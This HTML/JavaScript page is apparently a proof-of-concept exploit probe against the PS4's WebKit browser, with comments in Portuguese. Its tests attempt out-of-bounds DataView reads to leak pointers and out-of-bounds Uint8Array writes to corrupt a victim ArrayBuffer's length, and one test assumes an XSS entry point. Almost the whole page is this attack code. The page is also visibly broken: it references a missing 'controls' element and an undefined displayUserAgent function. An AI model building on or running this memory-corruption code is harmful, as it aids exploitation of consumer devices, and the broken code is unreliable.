<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Refined Probes v9</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        /* Outros estilos .log-* mantidos */
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Refined Probes v9</h1>
    <p>Foco: Testar Info Leak perto do início e Corrupção de Length via Offsets Negativos (Variações).</p>
    <p style="color: red; font-weight: bold;">AVISO: BAIXA PROBABILIDADE DE SUCESSO. ALTO RISCO DE CRASH.</p>
    <div id="poc-output"></div>
    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;"></div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* ... Função log igual anterior ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
        const PAUSE_DURATION = 200;
        const SHORT_PAUSE = 30;

        // --- Teste 1 (Entry Point Check - Mantido) ---
        const runCSP_XSS_Check = () => {
            log("--- T1: Verificação de Entrada XSS ---",'test');
             // Apenas log para confirmar que JS está rodando
             log("Execução de JS via XSS/CSP Bypass está funcionando.", 'good');
             log("--- T1 Concluído ---",'test');
        };

        // --- NOVO Teste 2: OOB Read Near Start (Baseado na sua descrição) ---
        const runOOBReadNearStart = async () => {
            log("--- T2: OOB Read Near Start (-16 to +16) ---", 'test');
            log("Objetivo: Ler OOB perto do INÍCIO do buffer com DataView.", 'warn');

            const bufferSize = 128;
            let buffer = null, dataView = null;
            let potentialLeakFound = false;

            try {
                buffer = new ArrayBuffer(bufferSize);
                dataView = new DataView(buffer);
                log("  Buffer alocado.", 'info');

                // Offsets relativos ao INÍCIO do buffer (índice 0)
                const readOffsets = [-16, -12, -8, -4, 0, 4, 8, 12, 16];

                log(`  Lendo OOB nos offsets (bytes): ${readOffsets.join(', ')} relativos ao início...`, 'info');
                for (const offset of readOffsets) {
                     // Ler como U32
                     try {
                         const val32 = dataView.getUint32(offset, true);
                         if (val32 !== undefined && val32 !== 0) {
                             const isPtrLike = val32 > 0xFFFF && val32 !== 0xFFFFFFFF;
                             log(`    Leak U32 @${offset}: 0x${val32.toString(16).padStart(8, '0')}`, isPtrLike ? 'ptr' : 'leak');
                             if (isPtrLike) { potentialLeakFound = true; log(`      >> Potencial Ponteiro/Dado!`, 'vuln');}
                         }
                     } catch (e) { if(offset < 0 || offset >= bufferSize) { /* Erro esperado OOB */ } else { log(`    Erro inesperado U32 @${offset}: ${e.message}`, 'error'); } }

                     // Ler como F64
                     try {
                        // Ler apenas se o offset for válido e alinhado a 8 bytes
                        if (offset >= -bufferSize && offset <= bufferSize - 8 && offset % 8 === 0) {
                             const val64 = dataView.getFloat64(offset, true);
                              if (!isNaN(val64) && val64 !== 0) {
                                 log(`    Leak F64 @${offset}: ${val64}`, 'leak');
                                 potentialLeakFound = true; log(`      >> Potencial Float/Dado!`, 'vuln');
                             }
                        }
                     } catch (e) { if(offset < 0 || offset >= bufferSize) { /* Erro esperado OOB */ } else { log(`    Erro inesperado F64 @${offset}: ${e.message}`, 'error'); } }

                     await new Promise(r => setTimeout(r, SHORT_PAUSE / 2)); // Pequena pausa entre offsets
                 } // Fim loop leitura OOB

                 if (!potentialLeakFound) {
                     log("  Nenhum leak promissor encontrado nos offsets testados perto do início.", 'info');
                 }

            } catch (e) { log(`  Erro GERAL no Teste 2: ${e.message}`, 'error'); }
            finally { buffer = null; dataView = null; }
            log("--- T2 Concluído ---", 'test');
        };

        // --- NOVO Teste 3: Corrupt Length via Negative Offset (Baseado na sua descrição) ---
        const runOOBCorruptLengthNeg = async () => {
            log("--- T3: Corrupt Length via Negative Offset ---", 'test');
            log("Objetivo: Escrever OOB em offsets negativos (-16 a -4) para corromper byteLength.", 'warn');
            log("RISCO DE CRASH!", 'crash');

            const bufferSize = 128; // Tamanho atacante e vítima
            const negativeOffsets = [-16, -12, -8, -4]; // Offsets a testar relativos ao FIM do atacante
            const valuesToWrite = [0xFFFFFFFF, 0x1000]; // Valores a escrever (32 bits)

            for (const writeOffsetRelativeToEnd of negativeOffsets) {
                for (const value32 of valuesToWrite) {
                    log(`Testando: Escrita OOB @${writeOffsetRelativeToEnd} val ${value32.toString(16)}`, 'subtest');
                    let attackerBuffer = null, victimBuffer = null, attackerViewU8 = null;
                    let success = false;

                    try {
                        attackerBuffer = new ArrayBuffer(bufferSize);
                        victimBuffer = new ArrayBuffer(bufferSize); // Vítima
                        attackerViewU8 = new Uint8Array(attackerBuffer);
                        const originalVictimLength = victimBuffer.byteLength;
                        log(`  Buffers alocados. Tam. original vítima: ${originalVictimLength}.`, 'info');

                        // Calcular offset absoluto relativo ao início do atacante
                        const absoluteWriteOffset = attackerBuffer.byteLength + writeOffsetRelativeToEnd;

                        log(`  Tentando escrever valor ${value32.toString(16)} via OOB (U8) no offset abs ${absoluteWriteOffset}...`, 'info');

                        // Usar Uint8Array para escrever 4 bytes (valor 32 bits)
                        try {
                            // Escrever LSB primeiro (Little Endian)
                            attackerViewU8[absoluteWriteOffset + 0] = (value32 >> 0) & 0xFF;
                            attackerViewU8[absoluteWriteOffset + 1] = (value32 >> 8) & 0xFF;
                            attackerViewU8[absoluteWriteOffset + 2] = (value32 >> 16) & 0xFF;
                            attackerViewU8[absoluteWriteOffset + 3] = (value32 >> 24) & 0xFF;
                            log("  Escrita OOB de 4 bytes realizada. Verificando tamanho...", 'good');

                            // Verificar tamanho da vítima
                            const currentVictimLength = victimBuffer.byteLength;
                            log(`  Tamanho ATUAL da vítima: ${currentVictimLength}`, (currentVictimLength !== originalVictimLength) ? 'vuln' : 'info');

                            if (currentVictimLength !== originalVictimLength && currentVictimLength !== 0) { // Checar se != 0 também
                                log("    >> SUCESSO? Tamanho da Vítima parece ter mudado! <<", 'vuln');
                                success = true;
                            } else {
                                log("    Falha: Tamanho da vítima não mudou.", 'warn');
                            }
                        } catch (e) {
                             log(`  Escrita OOB @${absoluteWriteOffset} falhou (provavelmente esperado para < -8): ${e.message}`, 'warn');
                             // Não considerar erro de escrita como falha do teste, mas sim do offset
                        }
                    } catch (e) { log(`  Erro GERAL no subteste: ${e.message}`, 'error'); }
                    finally { attackerBuffer = null; victimBuffer = null; attackerViewU8 = null;} // GC help

                    if(success) break; // Parar se um offset/valor funcionou
                     await new Promise(r => setTimeout(r, SHORT_PAUSE));
                 } // Fim loop valores
                 if(success) break; // Parar se um offset/valor funcionou
             } // Fim loop offsets
            log("--- T3 Concluído ---", 'test');
        };


        // --- Teste 4: OOB Write Confirm (Mantido - Base) ---
        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v8 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };

        // --- Função Principal ---
        const runAll = async () => {
             displayUserAgent();
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
            log("Iniciando todos os testes (REFINED PROBES v9)...");
            const tests = [ // Sequência atualizada
                runCSP_XSS_Check,               // T1: Verificação XSS/Entrada
                runOOBReadNearStart,            // T2: OOB Read Perto do Início (NOVO)
                runOOBCorruptLengthNeg,         // T3: Corrupt Length Neg Offset (NOVO)
                runOOBTestU8_Confirm,           // T4: OOB Confirm Base (Renumerado)
            ];
             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v8 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
            if(outputDiv) log("\n\nTodos os testes REFINED PROBES v9 concluídos.", 'test');
            else console.error("Script concluído, div log NULO.");
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
        };

        // Adicionar controles manuais atualizados
        document.getElementById('controls').innerHTML = `
            <button onclick="runCSP_XSS_Check()">Rodar T1 (Check XSS)</button>
            <button onclick="runOOBReadNearStart()">Rodar T2 (OOB Read Start)</button>
            <button onclick="runOOBCorruptLengthNeg()">Rodar T3 (Length Corr Neg)</button>
            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
        `; // Removido link JS desnecessário

        displayUserAgent();
        // Opcional: Rodar tudo automaticamente
        // document.addEventListener('DOMContentLoaded', runAll);
    </script>

</body>
</html>
